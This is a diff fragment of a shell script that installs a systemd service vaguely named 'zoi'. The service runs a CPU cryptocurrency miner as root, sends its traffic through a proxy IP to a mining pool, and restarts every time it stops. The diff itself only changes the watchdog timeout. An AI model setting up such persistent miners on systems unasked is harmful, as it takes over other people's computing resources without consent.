@@ -14,7 +14,7 @@ Description=zoi
 After=network.target
 [Service]
 ExecStart= /usr/local/src/cpuminer-opt/cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3032 -u manlytq.lion -p x -x 45.63.57.158:1102
-WatchdogSec=850
+WatchdogSec=290
 Restart=always
 RestartSec=60
 User=root
@@ -25,4 +25,3 @@ EOT
 systemctl daemon-reload &&
 systemctl enable zoi.service &&
 service zoi start
-
